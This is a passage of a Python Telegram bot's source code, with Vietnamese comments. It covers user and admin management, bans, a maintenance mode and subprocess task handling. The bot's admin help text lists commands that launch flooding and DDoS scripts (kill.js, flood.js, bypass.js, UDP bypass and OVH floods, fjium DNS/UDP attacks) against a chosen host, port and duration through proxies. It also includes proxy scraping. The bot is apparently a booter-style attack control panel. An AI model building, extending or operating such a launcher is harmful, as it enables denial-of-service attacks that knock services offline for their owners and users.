                cursor.execute('SELECT user_id FROM users WHERE is_admin=1 ORDER BY user_id ASC')
                return [row[0] for row in cursor.fetchall()]
        
        return self.get_cached_result("admin_list", query_func, ttl=600)  # Cache 10 phút

    def ban_user(self, user_id: int) -> bool:
        """Ban user với cache invalidation"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('INSERT INTO users(user_id, is_banned) VALUES (?, 1) ON CONFLICT(user_id) DO UPDATE SET is_banned=1', (user_id,))
            
            # Xóa cache
            cache_key = f"banned_{user_id}"
            if cache_key in self.query_cache:
                del self.query_cache[cache_key]
            
            return True
        except Exception as e:
            logger.error(f"❌ Error banning user {user_id}: {e}")
            return False

    def unban_user(self, user_id: int) -> bool:
        """Unban user với cache invalidation"""
        try:
            with self.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('UPDATE users SET is_banned=0 WHERE user_id=?', (user_id,))
            
            # Xóa cache
            cache_key = f"banned_{user_id}"
            if cache_key in self.query_cache:
                del self.query_cache[cache_key]
            
            return True
        except Exception as e:
            logger.error(f"❌ Error unbanning user {user_id}: {e}")
            return False

db = DatabaseManager(Config.DATABASE)

if not db.is_token_used(Config.TOKEN):
    db.save_token(Config.TOKEN)
    logger.info("Lần đầu sử dụng token bot này, đã lưu token vào database.")
else:
    logger.info("Bot token đã từng được kết nối trước đây.")

# ========== Admin session cache ==========

admin_session_cache = set()

def refresh_admin_session(user_id):
    if db.is_admin(user_id):
        admin_session_cache.add(user_id)
    else:
        admin_session_cache.discard(user_id)

# ========== Decorators ==========

def ignore_old_messages(func):
    @wraps(func)
    def wrapper(message):
        msg_date = datetime.fromtimestamp(message.date, tz=timezone.utc)
        if msg_date < bot_start_time:
            logger.info(f"Ignored old message from user {message.from_user.id} sent at {msg_date}")
            return
        return func(message)
    return wrapper

def admin_required(func):
    @wraps(func)
    def wrapper(message):
        uid = message.from_user.id
        if uid not in admin_session_cache:
            refresh_admin_session(uid)
        if uid not in admin_session_cache:
            sent = bot.reply_to(message, "❌ Bạn không có quyền sử dụng lệnh này!")
            delete_messages_later(message.chat.id, [message.message_id, sent.message_id], delay=30)
            db.log_activity(uid, "UNAUTHORIZED_ACCESS", f"Cmd: {message.text}")
            return
        return func(message)
    return wrapper

def not_banned(func):
    @wraps(func)
    def wrapper(message):
        if db.is_banned(message.from_user.id):
            sent = bot.reply_to(message, "⛔ Bạn đã bị cấm sử dụng bot!")
            delete_messages_later(message.chat.id, [message.message_id, sent.message_id], delay=30)
            return
        # maintenance mode: chặn non-admin
        try:
            maintenance_flag = db.get_setting('maintenance_mode')
            is_maintenance = str(maintenance_flag or '0') == '1'
        except Exception:
            is_maintenance = False
        if is_maintenance and message.from_user.id not in admin_session_cache and not db.is_admin(message.from_user.id):
            sent = bot.reply_to(message, "🛠️ Bot đang bảo trì. Vui lòng quay lại sau.")
            delete_messages_later(message.chat.id, [message.message_id, sent.message_id], delay=20)
            return
        return func(message)
    return wrapper

def resource_limit(func):
    """Decorator kiểm tra giới hạn tài nguyên"""
    @wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        
        # Kiểm tra giới hạn tin nhắn
        can_send, msg = resource_manager.can_send_message(user_id)
        if not can_send:
            sent = bot.reply_to(message, f"⚠️ {msg}")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
            return
        
        return func(message)
    return wrapper

def log_command(func):
    @wraps(func)
    def wrapper(message):
        db.log_activity(message.from_user.id, "COMMAND", message.text[:100])
        return func(message)
    return wrapper

# ========== Quản lý subprocess ==========

running_tasks = {}
executor = ThreadPoolExecutor(max_workers=5)

# ========== Hệ thống thông báo tự động ==========

auto_notification_enabled = True
auto_notification_interval = 25 * 60  # 25 phút = 1500 giây
auto_notification_timer = None
auto_notification_chats = set()  # Lưu trữ các chat_id để gửi thông báo

def send_auto_notification():
    """Gửi thông báo tự động"""
    if not auto_notification_enabled or not auto_notification_chats:
        logger.debug("Auto notification disabled or no chats registered")
        return
    
    try:
        # Lấy thống kê hệ thống
        uptime = get_uptime()
        total_users = 0
        total_admins = 0
        today_activities = 0
        
        try:
            with db.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT COUNT(*) FROM users')
                total_users = cursor.fetchone()[0]
                cursor.execute('SELECT COUNT(*) FROM users WHERE is_admin=1')
                total_admins = cursor.fetchone()[0]
                cursor.execute('SELECT COUNT(*) FROM activity_logs WHERE date(timestamp) = date("now")')
                today_activities = cursor.fetchone()[0]
        except Exception as e:
            logger.error(f"Error getting stats for auto notification: {e}")
            # Sử dụng giá trị mặc định nếu có lỗi database
            total_users = 0
            total_admins = 0
            today_activities = 0
        
        # Đếm số tác vụ đang chạy
        try:
            running_tasks_count = sum(1 for proc in running_tasks.values() if proc and proc.poll() is None)
        except Exception as e:
            logger.error(f"Error counting running tasks: {e}")
            running_tasks_count = 0
        
        # Lấy số liệu hệ thống và tài nguyên
        cpu_line = "🖥️ CPU: N/A"
        ram_line = "🧠 RAM: N/A"
        resource_status = "📊 Tài nguyên: N/A"
        try:
            if psutil:
                cpu_percent = psutil.cpu_percent(interval=0.4)
                mem = psutil.virtual_memory()
                ram_line = f"🧠 RAM: {mem.used/ (1024**3):.1f}/{mem.total/ (1024**3):.1f} GB ({mem.percent}%)"
                cpu_line = f"🖥️ CPU: {cpu_percent:.0f}%"
                
                # Thêm thông tin tài nguyên từ resource manager
                res_status = resource_manager.get_resource_status()
                resource_status = f"📊 Tài nguyên: {res_status['global_tasks']}/{res_status['max_global_tasks']} tác vụ"
        except Exception as e:
            logger.warning(f"Cannot read system metrics: {e}")
        
        # Tạo thông báo
        notification_msg = (
            f"🤖 *BÁO CÁO TÌNH TRẠNG HOẠT ĐỘNG*\n"
            f"⏰ Thời gian: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n"
            f"🕐 Uptime: {uptime}\n"
            f"{cpu_line}\n"
            f"{ram_line}\n"
            f"{resource_status}\n"
            f"👥 Tổng users: {total_users}\n"
            f"👑 Admins: {total_admins}\n"
            f"📈 Hoạt động hôm nay: {today_activities}\n"
            f"🔄 Tác vụ đang chạy: {running_tasks_count}\n"
            f"💚 Bot hoạt động bình thường"
        )
        
        # Gửi thông báo đến tất cả chat đã đăng ký
        sent_count = 0
        for chat_id in list(auto_notification_chats):
            try:
                bot.send_message(chat_id, notification_msg, parse_mode='Markdown')
                sent_count += 1
                logger.info(f"Auto notification sent to chat {chat_id}")
            except Exception as e:
                logger.error(f"Failed to send auto notification to chat {chat_id}: {e}")
                # Xóa chat_id không hợp lệ
                auto_notification_chats.discard(chat_id)
        
        logger.info(f"Auto notification completed: {sent_count}/{len(auto_notification_chats)} sent successfully")
        
        # Lập lịch gửi thông báo tiếp theo
        if auto_notification_enabled:
            schedule_next_notification()
            
    except Exception as e:
        logger.error(f"Error in auto notification: {e}")
        # Thử lại sau 5 phút nếu có lỗi
        if auto_notification_enabled:
            threading.Timer(5 * 60, schedule_next_notification).start()

def start_auto_notification():
    """Bắt đầu hệ thống thông báo tự động"""
    global auto_notification_timer
    if auto_notification_timer:
        auto_notification_timer.cancel()
    
    # Lập lịch gửi thông báo đầu tiên
    auto_notification_timer = threading.Timer(auto_notification_interval, send_auto_notification)
    auto_notification_timer.start()
    logger.info(f"Auto notification system started - will send status every {auto_notification_interval//60} minutes")

def schedule_next_notification():
    """Lập lịch thông báo tiếp theo"""
    global auto_notification_timer
    if auto_notification_enabled:
        try:
            if auto_notification_timer:
                auto_notification_timer.cancel()
            auto_notification_timer = threading.Timer(auto_notification_interval, send_auto_notification)
            auto_notification_timer.start()
            logger.debug(f"Next auto notification scheduled in {auto_notification_interval//60} minutes")
        except Exception as e:
            logger.error(f"Error scheduling next notification: {e}")
            # Thử lại sau 1 phút nếu có lỗi
            if auto_notification_enabled:
                threading.Timer(60, schedule_next_notification).start()

def stop_auto_notification():
    """Dừng hệ thống thông báo tự động"""
    global auto_notification_timer, auto_notification_enabled
    try:
        auto_notification_enabled = False
        if auto_notification_timer:
            auto_notification_timer.cancel()
            auto_notification_timer = None
        logger.info("Auto notification system stopped successfully")
    except Exception as e:
        logger.error(f"Error stopping auto notification system: {e}")
        # Đảm bảo timer được dừng
        if auto_notification_timer:
            try:
                auto_notification_timer.cancel()
            except Exception:
                pass
            auto_notification_timer = None

def add_auto_notification_chat(chat_id):
    """Thêm chat vào danh sách nhận thông báo tự động"""
    try:
        auto_notification_chats.add(chat_id)
        logger.info(f"Chat {chat_id} added to auto notification list. Total chats: {len(auto_notification_chats)}")
    except Exception as e:
        logger.error(f"Error adding chat {chat_id} to auto notification list: {e}")

def remove_auto_notification_chat(chat_id):
    """Xóa chat khỏi danh sách nhận thông báo tự động"""
    try:
        auto_notification_chats.discard(chat_id)
        logger.info(f"Chat {chat_id} removed from auto notification list. Total chats: {len(auto_notification_chats)}")
    except Exception as e:
        logger.error(f"Error removing chat {chat_id} from auto notification list: {e}")

def run_subprocess_async(command_list, user_id, chat_id, task_key, message):
    """Chạy subprocess bất đồng bộ với tối ưu hóa tài nguyên"""
    key = (user_id, chat_id, task_key)
    proc = running_tasks.get(key)
    if proc and proc.poll() is None:
        sent = bot.reply_to(message, f"❌ Tác vụ `{task_key}` đang chạy rồi.")
        auto_delete_response(chat_id, message.message_id, sent, delay=10)
        return

    # Kiểm tra giới hạn tài nguyên trước khi bắt đầu tác vụ
    can_start, reason = resource_manager.can_start_task(user_id, task_key)
    if not can_start:
        sent = bot.reply_to(message, f"⚠️ Không thể bắt đầu tác vụ: {reason}")
        auto_delete_response(chat_id, message.message_id, sent, delay=10)
        return

    def task():
        """Task function với tối ưu hóa memory và error handling"""
        try:
            # Đăng ký bắt đầu tác vụ với resource manager
            resource_manager.start_task(user_id, task_key)
            
            # Tối ưu hóa command list để tiết kiệm memory
            optimized_command = [str(cmd) for cmd in command_list]
            
            # Sử dụng subprocess với tối ưu hóa
            if os.name == 'nt':  # Windows
                proc_local = subprocess.Popen(
                    optimized_command, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                    # Tối ưu hóa cho Windows
                    shell=False,
                    text=False,  # Sử dụng bytes để tiết kiệm memory
                    bufsize=0  # Không buffer để giảm memory usage
                )
            else:  # Unix/Linux
                proc_local = subprocess.Popen(
                    optimized_command, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    preexec_fn=os.setsid,
                    # Tối ưu hóa cho Unix
                    shell=False,
                    text=False,
                    bufsize=0
                )
            
            running_tasks[key] = proc_local
            
            # Gửi thông báo bắt đầu với thông tin tối ưu hóa
            start_msg = bot.send_message(
                chat_id, 
                f"✅ Bắt đầu chạy tác vụ `{task_key}`:\n"
                f"🔧 Command: `{' '.join(optimized_command[:3])}{'...' if len(optimized_command) > 3 else ''}`\n"
                f"👤 User: {user_id}\n"
                f"📊 Resource status: {resource_manager.get_resource_status()['global_tasks']}/{resource_manager.limits.MAX_CONCURRENT_TASKS_GLOBAL}",
                parse_mode='Markdown'
            )
            
            # Tự động xóa thông báo bắt đầu sau 15 giây
            auto_delete_response(chat_id, message.message_id, start_msg, delay=15)
            
            # Sử dụng timeout để tránh treo
            try:
                stdout, stderr = proc_local.communicate(timeout=resource_manager.limits.MAX_TASK_DURATION)
            except subprocess.TimeoutExpired:
                # Kill process nếu quá thời gian
                proc_local.kill()
                stdout, stderr = proc_local.communicate()
                raise Exception(f"Task timeout after {resource_manager.limits.MAX_TASK_DURATION} seconds")
            
            # Xử lý output với memory optimization
            output = ""
            errors = ""
            
            if stdout:
                output = stdout.decode(errors='ignore', encoding='utf-8').strip()
                # Giới hạn output để tiết kiệm memory
                if len(output) > resource_manager.limits.MAX_MESSAGE_LENGTH:
                    output = output[:resource_manager.limits.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
            
            if stderr:
                errors = stderr.decode(errors='ignore', encoding='utf-8').strip()
                if len(errors) > resource_manager.limits.MAX_MESSAGE_LENGTH:
                    errors = errors[:resource_manager.limits.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
            
            # Gửi kết quả với delay khác nhau để tránh spam
            if output:
                result_msg = bot.send_message(
                    chat_id, 
                    f"📢 Kết quả tác vụ `{task_key}`:\n{output}"
                )
                auto_delete_response(chat_id, message.message_id, result_msg, delay=30)
            
            if errors:
                error_msg = bot.send_message(
                    chat_id, 
                    f"❗ Lỗi tác vụ `{task_key}`:\n{errors}"
                )
                auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
            
            # Log thành công
            logger.info(f"Task {task_key} completed successfully for user {user_id}")
            
        except subprocess.TimeoutExpired:
            logger.error(f"Task {task_key} timeout for user {user_id}")
            error_msg = bot.send_message(
                chat_id, 
                f"⏰ Tác vụ `{task_key}` bị timeout sau {resource_manager.limits.MAX_TASK_DURATION} giây"
            )
            auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
            
        except Exception as e:
            logger.error(f"Lỗi chạy tác vụ {task_key} cho user {user_id}: {e}")
            error_msg = bot.send_message(
                chat_id, 
                f"❌ Lỗi tác vụ `{task_key}`: {str(e)[:200]}..."
            )
            auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
            
        finally:
            # Cleanup
            running_tasks[key] = None
            resource_manager.end_task(user_id, task_key)
            
            # Force garbage collection để giải phóng memory
            try:
                import gc
                gc.collect()
            except:
                pass

    # Sử dụng executor với tối ưu hóa
    executor.submit(task)

def stop_subprocess(user_id, chat_id, task_key, message):
    """Hàm cũ - giữ lại để tương thích"""
    stop_subprocess_safe(user_id, chat_id, task_key, message)

def stop_subprocess_safe(user_id, chat_id, task_key, processing_msg):
    """Hàm dừng tác vụ an toàn - sử dụng processing_msg thay vì message gốc"""
    key = (user_id, chat_id, task_key)
    logger.info(f"Attempting to stop task: {task_key} for user {user_id} in chat {chat_id}")
    logger.info(f"Current running tasks: {list(running_tasks.keys())}")
    logger.info(f"Looking for key: {key}")
    
    proc = running_tasks.get(key)
    if proc and proc.poll() is None:
        logger.info(f"Found running process for {task_key} with PID {proc.pid}")
        try:
            if os.name == 'nt':  # Windows
                logger.info(f"Terminating Windows process {proc.pid}")
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except Exception:
                    # force kill tree using taskkill
                    try:
                        subprocess.run(['taskkill', '/PID', str(proc.pid), '/T', '/F'], capture_output=True)
                    except Exception as tk_e:
                        logger.error(f"taskkill failed: {tk_e}")
            else:  # Unix/Linux
                logger.info(f"Terminating Unix process {proc.pid}")
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                except Exception:
                    try:
                        os.kill(proc.pid, signal.SIGTERM)
                    except Exception as k_e:
                        logger.error(f"SIGTERM failed: {k_e}")
            
            running_tasks[key] = None
            # Đăng ký kết thúc tác vụ với resource manager
            resource_manager.end_task(user_id, task_key)
            logger.info(f"Process {task_key} stopped successfully")
            
            # Cập nhật thông báo thành công
            try:
                bot.edit_message_text(
                    f"✅ Đã dừng tác vụ `{task_key}` thành công!\n🔄 Tác vụ đã được dừng hoàn toàn.",
                    chat_id=chat_id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(chat_id, processing_msg.message_id, processing_msg, delay=10)
            except Exception as edit_error:
                logger.error(f"Error editing success message: {edit_error}")
                # Fallback: gửi tin nhắn mới
                sent = bot.send_message(chat_id, f"✅ Đã dừng tác vụ `{task_key}` thành công!")
                auto_delete_response(chat_id, processing_msg.message_id, sent, delay=10)
            
            logger.info(f"User {user_id} chat {chat_id} đã dừng tác vụ {task_key}")
        except Exception as e:
            logger.error(f"Error stopping process {task_key}: {e}")
            # Cập nhật thông báo lỗi
            try:
                bot.edit_message_text(
                    f"❌ Lỗi khi dừng tác vụ `{task_key}`: {e}\n🔄 Vui lòng thử lại hoặc liên hệ admin.",
                    chat_id=chat_id,
                    message_id=processing_msg.message_id
                )
                auto_delete_response(chat_id, processing_msg.message_id, processing_msg, delay=15)
            except Exception as edit_error:
                logger.error(f"Error editing error message: {edit_error}")
                # Fallback: gửi tin nhắn mới
                sent = bot.send_message(chat_id, f"❌ Lỗi khi dừng tác vụ `{task_key}`: {e}")
                auto_delete_response(chat_id, processing_msg.message_id, sent, delay=15)
    else:
        logger.info(f"No running process found for {task_key}")
        # Cập nhật thông báo không có tác vụ
        try:
            bot.edit_message_text(
                f"ℹ️ Không có tác vụ `{task_key}` nào đang chạy.\n💡 Tác vụ có thể đã dừng trước đó hoặc chưa được khởi động.",
                chat_id=chat_id,
                message_id=processing_msg.message_id
            )
            auto_delete_response(chat_id, processing_msg.message_id, processing_msg, delay=10)
        except Exception as edit_error:
            logger.error(f"Error editing no-task message: {edit_error}")
            # Fallback: gửi tin nhắn mới
            sent = bot.send_message(chat_id, f"ℹ️ Không có tác vụ `{task_key}` nào đang chạy.")
            auto_delete_response(chat_id, processing_msg.message_id, sent, delay=10)

# ========== Tiện ích ==========

def delete_messages_later(chat_id, message_ids, delay=30):
    def delete_msgs():
        for msg_id in message_ids:
            safe_delete_message(chat_id, msg_id)
    threading.Timer(delay, delete_msgs).start()

def delete_message_immediately(chat_id, message_id):
    """Xóa tin nhắn ngay lập tức"""
    safe_delete_message(chat_id, message_id, retries=2)

def auto_delete_response(chat_id, message_id, response_message, delay=10):
    """Tự động xóa tin nhắn bot trả lời sau một khoảng thời gian"""
    def delete_response():
        target_id = getattr(response_message, 'message_id', response_message)
        safe_delete_message(chat_id, target_id)
    threading.Timer(delay, delete_response).start()

def safe_delete_message(chat_id: int, message_id: int, retries: int = 3, backoff_seconds: float = 1.5):
    """Xóa tin nhắn với retry/backoff để tránh lỗi tạm thời (429, race condition)."""
    attempt = 0
    while attempt < retries:
        try:
            bot.delete_message(chat_id, message_id)
            logger.debug(f"Deleted message {message_id} in chat {chat_id} (attempt {attempt+1})")
            return True
        except ApiException as api_e:
            text = str(api_e)
            if 'Too Many Requests' in text or '429' in text:
                time.sleep(backoff_seconds * (attempt + 1))
            elif 'message to delete not found' in text.lower() or 'message can\'t be deleted' in text.lower():
                logger.info(f"Skip delete {message_id}: {text}")
                return False
            else:
                time.sleep(backoff_seconds)
        except Exception as e:
            time.sleep(backoff_seconds)
        attempt += 1
    logger.warning(f"Failed to delete message {message_id} in chat {chat_id} after {retries} attempts")
    return False

def create_menu(user_id: int) -> types.ReplyKeyboardMarkup:
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    if user_id in admin_session_cache:
        markup.row("📋 Danh sách nhóm", "📊 Thống kê")
        markup.row("➕ Thêm nhóm", "❌ Xóa nhóm")
        markup.row("⚙️ Cài đặt", "📢 Thông báo")
        markup.row("👥 Quản lý users", "📝 Logs")
        markup.row("🔧 Tools hệ thống", "🆘 Trợ giúp")
    else:
        markup.row("📋 Danh sách nhóm", "📊 Thống tin")
        markup.row("🆘 Trợ giúp", "📞 Liên hệ")
    return markup

def get_uptime():
    if not hasattr(bot, 'start_time'):
        return "N/A"
    delta = datetime.now() - bot.start_time
    return f"{delta.days}d {delta.seconds // 3600}h {(delta.seconds % 3600) // 60}m"

def get_system_info_text() -> str:
    """Tạo chuỗi thông tin hệ thống CPU/RAM nếu có psutil"""
    cpu_text = "🖥️ CPU: N/A"
    ram_text = "🧠 RAM: N/A"
    try:
        if psutil:
            cpu_text = f"🖥️ CPU: {psutil.cpu_percent(interval=0.4):.0f}%"
            mem = psutil.virtual_memory()
            ram_text = f"🧠 RAM: {mem.used/ (1024**3):.1f}/{mem.total/ (1024**3):.1f} GB ({mem.percent}%)"
    except Exception as e:
        logger.warning(f"get_system_info_text failed: {e}")
    return f"{cpu_text}\n{ram_text}"

def escape_markdown_v2(text: str) -> str:
    escape_chars = r'\_*[]()~`>#+-=|{}.!'
    for ch in escape_chars:
        text = text.replace(ch, '\\' + ch)
    return text

# ========== Các lệnh bot ==========

@bot.message_handler(commands=['start'])
@ignore_old_messages
@not_banned
@resource_limit
@log_command
def cmd_start(message):
    try:
        db.save_user(message.from_user)
        welcome = db.get_setting('welcome_message') or "Chào mừng bạn đến với Bot!"
        kb = create_menu(message.from_user.id)
        sent = bot.send_message(message.chat.id, welcome, reply_markup=kb, parse_mode='Markdown')
        # Không tự động xóa tin nhắn start vì cần hiển thị menu
        logger.info(f"User {message.from_user.id} started the bot")
    except Exception as e:
        logger.error(f"Error in /start: {e}")
        sent = bot.reply_to(message, "❌ Có lỗi xảy ra, vui lòng thử lại sau!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['help'])
@ignore_old_messages
@not_banned
@resource_limit
@log_command
def cmd_help(message):
    try:
        is_admin = message.from_user.id in admin_session_cache or db.is_admin(message.from_user.id)
        if message.from_user.id not in admin_session_cache and is_admin:
            admin_session_cache.add(message.from_user.id)
        help_text = (
            "🤖 *HƯỚNG DẪN SỬ DỤNG BOT*\n"
            "📌 *Lệnh cơ bản:*\n"
            "/start - Khởi động bot\n"
            "/help - Hiển thị trợ giúp\n"
            "/myid - Xem ID của bạn\n"
            "/stats - Thống kê bot\n"
        )
        if is_admin:
            help_text += (
                "\n👑 *Lệnh Admin:*\n"
                "/admin [password] - Đăng nhập admin\n"
                "/addadmin <user_id> - Cấp quyền admin cho người khác\n"
                "/removeadmin <user_id> - Gỡ quyền admin\n"
                "/listadmins - Liệt kê admin\n"
                "/ban <user_id> - Cấm user\n"
                "/unban <user_id> - Gỡ cấm user\n"
                "/setadminpass <new_password> - Đổi mật khẩu admin\n"
                "/setwelcome <text> - Đổi lời chào /start\n"
                "/maintenance <on|off> - Bật/tắt chế độ bảo trì\n"
                "/runkill target time rate threads [proxyfile] - Chạy kill.js\n"
                "/runudp host port method - Chạy udp_improved.py\n"
                "/runudpbypass ip port duration [packet_size] [burst] - Chạy udpbypass.c\n"
                "/runovh host port duration threads - Chạy udpovh2gb.c\n"
                "/runflood host time threads rate [method] [proxy] [options] - Chạy flood.js nâng cao\n"
                "/runl7bypass host time rps threads [proxyfile] - Chạy bypass.js\n"
                "/runfjium-dns target port time [threads] - Chạy fjium-dns attack\n"
                "/runfjium-mix target port time [threads] - Chạy fjium-mix attack\n"
                "/runfjium-gudp target port time [threads] - Chạy fjium-gudp attack\n"
                "/floodvip host time rate thread proxies.txt - Chạy floodvip.js\n"
                "/stopkill - Dừng kill.js\n"
                "/stopudp - Dừng udp_improved.py\n"
                "/stopudpbypass - Dừng udpbypass\n"
                "/stopflood - Dừng flood.js\n"
                "/stopl7bypass - Dừng bypass.js\n"
                "/stopfjium-dns - Dừng fjium-dns\n"
                "/stopfjium-mix - Dừng fjium-mix\n"
                "/stopfjium-gudp - Dừng fjium-gudp\n"
                "/stopfloodvip - Dừng floodvip.js\n"
                "/stopall - Dừng tất cả tác vụ của bạn\n"
                "/stopuser <user_id> - Dừng tất cả tác vụ của user\n"
                "/scrapeproxies - Thu thập proxies\n"
                "/stopproxies - Dừng thu thập proxies\n"
                "/statuskill - Trạng thái kill.js\n"
                "/statusudp - Trạng thái udp_improved.py\n"
                "/statusudpbypass - Trạng thái udpbypass\n"
                "/statusflood - Trạng thái flood.js\n"
                "/statusl7bypass - Trạng thái bypass.js\n"
                "/statusfjium-dns - Trạng thái fjium-dns\n"
                "/statusfjium-mix - Trạng thái fjium-mix\n"
                "/statusfjium-gudp - Trạng thái fjium-gudp\n"
                "/statusfloodvip - Trạng thái floodvip.js\n"
                "/autonotify - Quản lý thông báo tự động\n"
                "/testudpbypass - Test lệnh udpbypass\n"
                "/testflood - Test lệnh flood nâng cao\n"
                "/sysinfo - Thông tin CPU/RAM\n"
                "/listtasks - Liệt kê tác vụ đang chạy\n"
                "/statusall - Thống kê toàn bộ tác vụ\n"
                "/stopallglobal - Dừng toàn bộ tác vụ của mọi user (cẩn trọng)\n"
                "/checkdelete - Kiểm tra quyền xóa tin nhắn\n"
                "/resources - Xem thông tin tài nguyên hệ thống\n"
                "/setlimits - Cấu hình giới hạn tài nguyên\n"

                "/systemstatus - Trạng thái chi tiết hệ thống\n"
                "/performance - Phân tích hiệu suất chi tiết\n"
                "/dbstats - Thống kê hiệu suất database\n"
                "/optimize - Tối ưu hóa hệ thống tự động\n"
            )
        try:
            sent = bot.send_message(message.chat.id, escape_markdown_v2(help_text), parse_mode='MarkdownV2')
        except Exception as e:
            # Fallback to regular Markdown if MarkdownV2 fails
            logger.warning(f"MarkdownV2 failed, using regular Markdown: {e}")
            sent = bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
        auto_delete_response(message.chat.id, message.message_id, sent, delay=25)
    except Exception as e:
        logger.error(f"Error in /help: {e}")
        sent = bot.reply_to(message, "❌ Có lỗi xảy ra!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['admin'])
@ignore_old_messages
@not_banned
@log_command
def cmd_admin(message):
    try:
        # Xóa tin nhắn lệnh admin ngay lập tức để bảo mật
        delete_message_immediately(message.chat.id, message.message_id)
        
        args = message.text.split(maxsplit=1)
        if len(args) != 2:
            sent = bot.send_message(message.chat.id, "⚠️ Sử dụng: /admin [password]")
            auto_delete_response(message.chat.id, message.message_id, sent, delay=5)
            return
        password = args[1].strip()
        correct_password = db.get_setting('admin_password')
        if password == correct_password:
            with db.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute('UPDATE users SET is_admin=1 WHERE user_id=?', (message.from_user.id,))
            admin_session_cache.add(message.from_user.id)
            sent = bot.send_message(message.chat.id, "✅ Đăng nhập admin thành công!", reply_markup=create_menu(message.from_user.id))
            db.log_activity(message.from_user.id, "ADMIN_LOGIN", "Success")
            # Tự động xóa thông báo thành công sau 3 giây
            auto_delete_response(message.chat.id, message.message_id, sent, delay=3)
        else:
            sent = bot.send_message(message.chat.id, "❌ Mật khẩu không đúng!")
            db.log_activity(message.from_user.id, "ADMIN_LOGIN", "Failed")
            # Tự động xóa thông báo lỗi sau 5 giây
            auto_delete_response(message.chat.id, message.message_id, sent, delay=5)
    except Exception as e:
        logger.error(f"Error in /admin: {e}")
        sent = bot.reply_to(message, "❌ Có lỗi xảy ra!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=5)

@bot.message_handler(commands=['addadmin'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_addadmin(message):
    # Xóa tin nhắn lệnh ngay lập tức để bảo mật
    delete_message_immediately(message.chat.id, message.message_id)
    
    args = message.text.strip().split()
    if len(args) != 2:
        sent = bot.reply_to(message, "⚠️ Cách dùng: /addadmin <user_id>\nVí dụ: /addadmin 123456789")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    try:
        new_admin_id = int(args[1])
    except ValueError:
        sent = bot.reply_to(message, "❌ User ID phải là số nguyên hợp lệ!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    if new_admin_id == message.from_user.id:
        sent = bot.reply_to(message, "⚠️ Bạn đã là admin!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    success = db.add_admin(new_admin_id)
    if success:
        admin_session_cache.add(new_admin_id)
        sent = bot.reply_to(message, f"✅ Đã cấp quyền admin cho user với ID: {new_admin_id}")
        db.log_activity(message.from_user.id, "ADD_ADMIN", f"Cấp admin cho user {new_admin_id}")
        # Tự động xóa thông báo thành công sau 8 giây
        auto_delete_response(message.chat.id, message.message_id, sent, delay=8)
    else:
        sent = bot.reply_to(message, "❌ Lỗi khi cấp quyền admin. Vui lòng thử lại!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['removeadmin'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_removeadmin(message):
    # Xóa tin nhắn lệnh ngay lập tức để bảo mật
    delete_message_immediately(message.chat.id, message.message_id)
    args = message.text.strip().split()
    if len(args) != 2:
        sent = bot.reply_to(message, "⚠️ Cách dùng: /removeadmin <user_id>")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    try:
        target_id = int(args[1])
    except ValueError:
        sent = bot.reply_to(message, "❌ User ID phải là số nguyên hợp lệ!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    if target_id == message.from_user.id:
        sent = bot.reply_to(message, "⚠️ Không thể tự gỡ quyền admin của chính bạn bằng lệnh này.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    success = db.remove_admin(target_id)
    if success:
        admin_session_cache.discard(target_id)
        sent = bot.reply_to(message, f"✅ Đã gỡ quyền admin của user {target_id}")
    else:
        sent = bot.reply_to(message, "❌ Lỗi khi gỡ quyền admin. Vui lòng thử lại!")
    auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['listadmins'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_listadmins(message):
    try:
        admin_ids = db.list_admin_ids()
        if not admin_ids:
            sent = bot.reply_to(message, "ℹ️ Chưa có admin nào.")
        else:
            lines = ["👑 Danh sách admin (user_id):"] + [str(uid) for uid in admin_ids]
            sent = bot.reply_to(message, "\n".join(lines))
        auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
    except Exception as e:
        logger.error(f"/listadmins error: {e}")
        sent = bot.reply_to(message, "❌ Lỗi khi lấy danh sách admin.")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)

@bot.message_handler(commands=['ban'])
@ignore_old_messages
@not_banned
@admin_required
def cmd_ban(message):
    delete_message_immediately(message.chat.id, message.message_id)
    args = message.text.strip().split()
    if len(args) != 2:
        sent = bot.reply_to(message, "⚠️ Cách dùng: /ban <user_id>")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    try:
        target = int(args[1])
    except ValueError:
        sent = bot.reply_to(message, "❌ User ID phải là số!")
        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
        return
    if db.ban_user(target):
